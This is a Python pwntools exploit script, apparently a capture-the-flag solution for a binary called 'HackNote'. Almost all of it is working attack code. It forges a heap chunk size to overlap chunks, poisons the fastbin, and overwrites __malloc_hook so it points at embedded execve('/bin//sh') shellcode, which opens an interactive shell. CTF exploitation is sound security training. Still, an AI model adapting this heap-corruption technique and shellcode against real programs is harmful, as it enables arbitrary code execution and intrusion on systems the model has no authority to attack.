#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("./HackNote")
lib = 0
sh = 0

def menu(ch):
    sh.sendlineafter("-----------------",str(ch))

def add(size,content):
    sh.sendlineafter("-----------------","1")
    sh.sendlineafter("Input the Size",str(size))
    sh.sendafter(":",content)
def free(idx):
    sh.sendlineafter("-----------------","2")
    sh.sendlineafter(":",str(idx))
def edit(idx,content):
    sh.sendlineafter("-----------------","3")
    sh.sendlineafter(":",str(idx))
    sh.sendafter(":",content)

def exploit():
    add(0x18, '0'*0x18)
    edit(0, '0'*0x18)               #size ture larger
    add(0x18, '1'*0x18)
    add(0x38, '2'*0x38)
    add(0x18, '3'*0x18)
    add(0x18, '4'*0x18)

    #fake size overlapping
    edit(0, '0'*0x18 + '\x81' + '\n') 
    free(2)
    free(1)
    gdb.attach(sh, 'b* 0x400E67')
    shellcode = asm("xor rax,rax")
    shellcode += '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
    __malloc_hook = 0x6CB788
    #fake  chunk2' size and fd

    add(0x78, '1'*0x18 + p64(0x41) + p64(__malloc_hook - 0x16) + '\n')
    add(0x38, 'a\n')
    add(0x38, 'a'*6 + p64(__malloc_hook + 8) + shellcode + "\n")
    add(0x88, 'a\n')


    sh.interactive()
    sh.close()




    
if __name__ == "__main__":
    sh = process('./HackNote')
    exploit()